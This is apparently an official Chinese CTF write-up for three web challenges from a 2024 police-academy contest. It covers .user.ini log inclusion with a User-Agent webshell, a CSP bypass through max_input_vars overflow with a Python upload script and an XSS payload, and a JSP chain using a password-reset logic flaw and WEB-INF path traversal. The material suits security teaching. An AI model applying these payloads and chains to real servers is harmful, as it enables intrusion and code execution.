---
title: 第三届黄河流域公安院校网络空间安全技能挑战赛官方Writeup
contest: 第三届黄河流域公安院校网络空间安全技能挑战赛
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [黄河流域公安, .user.ini包含, log注入UA头, CSP绕过 max_input_vars=1000, JSP welcome泄露, 路径穿越/WEB-INF, 帆软FineReport反序列化]
attack_chain: 1.奶龙:未过滤.user.ini→auto_prepend_file=/var/log/nginx/access.log→UA头写马→2.外国山海经:CSP绕过用1000+参数触发Warning+header失败→XSS→3.Message Board:welcome.jsp泄露isValidUser逻辑→m1xian_a注册改m1xian密码→/fileload+路径穿越/WEB-INF
key_payload: "auto_prepend_file=/var/log/nginx/access.log;UA头写马;max_input_vars=1000;CSP bypass;isValidUser('username_password.txt');username=m1xian_a 改密码;/fileload文件上传"
one_liner: 第三届黄河流域公安院校挑战赛官方WP：.user.ini包含+CSP绕过XSS+JSP文件包含+路径穿越
lesson: .user.ini可作为LFI目标；max_input_vars=1000触发Warning致header失败可绕过CSP
quality: high
---

# 第三届黄河流域公安院校网络空间安全技能挑战赛官方Writeup

**赛事**：第三届黄河流域公安院校网络空间安全技能挑战赛（2024）

**官方Writeup - WEB**：

**1. 奶龙牌图片处理器（.user.ini包含）**
- 未过滤 `.user.ini` 文件
- 过滤了 `<?` 和 `php`
- 利用 `.user.ini` + 日志文件包含
- `auto_prepend_file=/var/log/nginx/access.log`
- **UA头写马**触发RCE

**2. 外国山海经（CSP绕过 XSS）**
- 默认 `max_input_vars=1000`
- 一旦超过，PHP产生Warning
- Docker PHP默认 `error_reporting` 为 `E_ALL & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED`
- 显示除Notice/Strict/Deprecated外所有错误
- **关键**：参数解析在脚本执行前
- 错误信息写入response → header()函数执行出错
- **CSP头无法输出** → XSS成功执行

**Payload**：
```python
import requests
from io import BytesIO

upload_url = "http://175.27.229.115:16345/flag.php?keyword=<svg onload=alert()>"
files = {}
for i in range(1, 22):  # 22文件
    filename = f'file{i}.txt'
    content = f'这是第{i}个文件'.encode('utf-8')
    files[f'file{i}'] = (filename, BytesIO(content))
response = requests.post(upload_url, files=files)
```

**3. Message Board（JSP 文件包含）**
- 路径穿越：`/a/b/..%00/WEB-INF/web.xml/.%00/WEB-INF/web.xml`
- 仅 `m1xian` 可访问 `/fileload`
- 登录后 welcome.jsp 注释泄露验证逻辑：
  ```java
  private boolean isValidUser(String username, String password) {
      try (BufferedReader reader = new BufferedReader(new FileReader("/var/lib/jetty/webapps/root/"+FILE_NAME))) {
          String line;
          while ((line = reader.readLine()) != null) {
              String[] parts = line.split("_");
              if (parts.length == 2 && parts[0].equals(username) && parts[1].equals(password)) {
                  return true;
              }
          }
      }
      return false;
  }
  ```
- 用户名密码用 `_` 连接存储
- **注册用户名 `m1xian_a`，密码置空** → 成功将m1xian密码改为a
- 登录后 `/fileload` 文件上传
- 路径穿越 `/%u002e/WEB-INF/lib`
- 帆软FineReport反序列化

**核心技术**：
- `.user.ini` LFI（auto_prepend_file）
- NGINX access.log 包含
- UA头写马
- **max_input_vars=1000 CSP绕过**
- header()失败导致CSP未输出
- JSP用户名密码逻辑分析
- 下划线分隔存储实现密码重置
- 帆软FineReport历史漏洞

**质量评估**：高（3道Web题详细利用链）
